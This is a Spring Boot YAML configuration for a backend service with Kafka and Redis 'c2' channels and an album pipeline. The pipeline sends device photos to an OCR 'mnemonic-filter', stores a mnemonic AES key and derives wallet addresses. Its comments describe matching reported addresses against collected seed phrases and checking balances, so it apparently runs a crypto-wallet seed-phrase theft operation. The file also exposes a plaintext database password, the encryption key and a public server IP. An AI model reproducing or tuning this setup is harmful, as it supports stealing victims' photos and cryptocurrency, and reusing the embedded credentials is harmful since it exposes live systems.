server:
  port: 8102
  max-http-header-size: 2MB
  tomcat:
    max-http-form-post-size: 50MB
    threads:
      max: 32
      min-spare: 4
  compression:
    enabled: true
    mime-types: application/json,application/xml,text/html,text/plain
    min-response-size: 1024

logging:
  level:
    root: INFO
    com.consume: INFO
    org.apache.kafka: WARN
    org.apache.kafka.clients.consumer.ConsumerConfig: ERROR
    org.apache.kafka.clients.producer.ProducerConfig: ERROR
    org.apache.kafka.common.utils.AppInfoParser: WARN
    org.springframework.kafka: WARN
    com.amazonaws: WARN
    com.amazonaws.util.Base64: ERROR
    com.amazonaws.services.s3: WARN

spring:
  application:
    name: 17-consume-server
  cloud:
    nacos:
      discovery:
        server-addr: http://127.0.0.1:8848
        namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试1
        #namespace: 0e71ca2d-2a33-48c1-922a-5d388210e675 #测试2
        #namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
        fail-fast: false
        heart-beat-interval: 5000
        heart-beat-timeout: 15000
        ip-delete-timeout: 30000
  mvc:
    pathmatch:
      matching-strategy: ant_path_matcher
  servlet:
    multipart:
      max-file-size: 500MB
      max-request-size: 500MB
  jackson:
    date-format: yyyy-MM-dd HH:mm:ss
    time-zone: GMT+8

  # ---------------------------------------------------------------------------
  # 2. 基础设施（MySQL / Redis / Kafka 连接；换环境主要改这里）
  # ---------------------------------------------------------------------------
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8&useServerPrepStmts=true&cachePrepStmts=true
    username: ioslianjie
    password: BAF4R22mwenXXxEH
    #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8&useServerPrepStmts=true&cachePrepStmts=true
    #username: root
    #password: Root@123
    type: com.alibaba.druid.pool.DruidDataSource
    initialSize: 16
    minIdle: 16
    maxActive: 120
    maxWait: 5000
    timeBetweenEvictionRunsMillis: 30000
    minEvictableIdleTimeMillis: 50000
    validationQuery: SELECT 1
    testWhileIdle: true
    testOnBorrow: false
    testOnReturn: false
    connectionErrorRetryAttempts: 3
    breakAfterAcquireFailure: false

  kafka:
    bootstrap-servers: 154.82.73.206:9092
    consumer:
      group-id: consumer-group          # 【换套必改】主通道消费组
      key-deserializer: org.apache.kafka.common.serialization.StringDeserializer
      value-deserializer: org.apache.kafka.common.serialization.StringDeserializer
      auto-offset-reset: earliest
      enable-auto-commit: false
      # 主通道 /a /event 轻：实测 records=300 + concurrency=16 可稳定提交
      max-poll-records: 300
      fetch-min-size: 1024
      fetch-max-wait: 200
      properties:
        spring.json.trusted.packages: "*"
        max.poll.interval.ms: 1800000
        session.timeout.ms: 60000
        heartbeat.interval.ms: 10000
    producer:
      key-serializer: org.apache.kafka.common.serialization.StringSerializer
      value-serializer: org.apache.kafka.common.serialization.StringSerializer
      acks: all
      properties:
        enable.idempotence: true
        compression.type: lz4
    listener:
      missing-topics-fatal: false
      ack-mode: record
      concurrency: 16

redis:
  host: 127.0.0.1
  port: 6379
  #password: 123456
  db: 0
  timeout: 3000
  pool:
    maxTotal: 96
    maxIdle: 32
    minIdle: 8

# =============================================================================
# 3. 【常调】双机角色 + 吞吐（压测/扩容优先改这一段）
# =============================================================================
c2:
  # --- 角色开关（同包双机；也可用启动参数覆盖）---
  # 主机：  main-enabled=true  album-enabled=false
  # 相册机：main-enabled=false album-enabled=true
  # 单机：  两者都 true
  channel:
    main-enabled: true
    album-enabled: true
  kafka:
    # --- Topic / 组 / DLQ（换套与 binding/report 对齐）---
    topic: c2_records
    topic-t: c2_records_t
    dlq-topic: c2_records.DLT
    dlq-topic-t: c2_records_t.DLT
    consumer:
      group-id-t: consumer-group-t
      # LAG 先降再涨吞吐：concurrency 过大 → 本机 CPU 打满 → 心跳失败 → 永久 rebalance → LAG 冻死
      max-poll-records-t: 100
      max-poll-interval-ms-t: 1800000
      session-timeout-ms-t: 60000
      heartbeat-interval-ms-t: 10000
      request-timeout-ms-t: 120000
      default-api-timeout-ms-t: 120000
    listener:
      concurrency-t: 16
    retry:
      max-elapsed-ms: 10000
      max-elapsed-ms-t: 5000

news4:
  redis-prefix: 'news4:'                # 【换套】与 binding/report 相同
  device-bind-python: true
  album:
    pool:                               # 解图（7z）；队列满则丢图(高峰允许)，不回压堵死消费
      core-size: 32
      max-size: 64
      queue-capacity: 2048
    # Kafka /t 卸载：listener 一律 ACK；池满则丢业务不回压 Kafka
    kafka-dispatch-pool:
      core-size: 8
      max-size: 16
      queue-capacity: 2000
    filter-pool:                        # 调 ocr-server 过滤；并发受 OCR 服务 max-concurrent 约束
      core-size: 16
      max-size: 32
      queue-capacity: 2048
    upload-pool:                        # S3
      core-size: 16
      max-size: 32
      queue-capacity: 2000
    # --- 相册路径 / 过滤规则 / 上云落库 ---
    #photo-dir: D:/c2_records/photos
    photo-dir: /opt/news4/data/photos
    photo-url-prefix: data/photos
    mnemonic-filter:
      enabled: true   # true=调 OCR 服务过滤；false=跳过识别，全部上云
      #service-name: ocr-server          # Nacos 服务名（base-url 为空时使用）
      base-url: http://154.82.73.206:8210  # 非空则直连，不走 Nacos
      connect-timeout-ms: 3000
      read-timeout-ms: 60000
    cloud:
      enabled: true
      key-prefix: photos
      batch-insert-enabled: true
      batch-insert-size: 50
      batch-insert-interval-ms: 200
  # --- C2 通知运输（kafka|redis）与 Redis Stream（仅 redis 时用）---
  c2:
    notify-transport: kafka
    album-kafka-offload: true
    album-async-retry-max: 8
    album-async-retry-delay-ms: 300
    notify-listen:
      enabled: true
    notify-stream: c2:new
    notify-stream-t: c2:new:t
    notify-group: news4-c2-notify
    notify-group-t: news4-c2-notify-t
    # Redis 消费吞吐（对标 Kafka concurrency / max-poll-records）
    notify-worker-threads: 12           # 主通道
    notify-worker-threads-t: 28         # 相册；勿超过 CPU 核数太多
    notify-read-count: 32               # 主每次 XREADGROUP 条数
    notify-read-count-t: 48             # 相册每次拉取
    notify-read-block-ms: 1000
    notify-read-block-ms-t: 1000        # 有货时更快醒来
    notify-claim-idle-ms: 180000
    notify-claim-idle-ms-t: 180000
    notify-claim-count: 32
    notify-claim-count-t: 32
    work:
      enabled: true
      load-retry-max: 5
      load-retry-delay-ms: 100

  mnemonic:
    mnemonic-aes-key: 'Mn3m0n1c@2024!SecureKey#news2'
  # 上报地址撞库：/ub /uj 拆地址 → reported_address；与助记词多 index 匹配后再查余额
  reported-address:
    enabled: true
    match-index-max: 5          # 派生 index 0..N
    match-mnemonic-limit: 20    # 同设备最多试几条词
    match-addr-limit: 200       # 每次最多处理多少 pending 地址
  wallet-derive:
    pool:
      core-size: 4
      max-size: 10
      queue-capacity: 2000

